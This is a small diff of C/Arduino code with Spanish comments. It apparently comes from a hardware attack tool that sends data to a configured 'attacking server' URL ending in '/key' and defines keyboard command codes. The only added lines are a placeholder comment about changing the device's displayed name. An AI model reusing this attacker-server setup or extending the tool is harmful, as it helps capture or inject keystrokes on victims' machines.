@@ -18,6 +18,9 @@ const char* password = ""; //Contraseña de la red WiFi
 // Servidor local
 const char* serverURL = "http://192.168.1.43:5555/key"; // Ajusta IP/puerto según el servidor atacante
 
+// Cambiar el nombre con el que aparece
+// Pendiente
+
 // Comandos especiales
 #define CMD_ESC        0x1B
 #define CMD_TAB        0x09
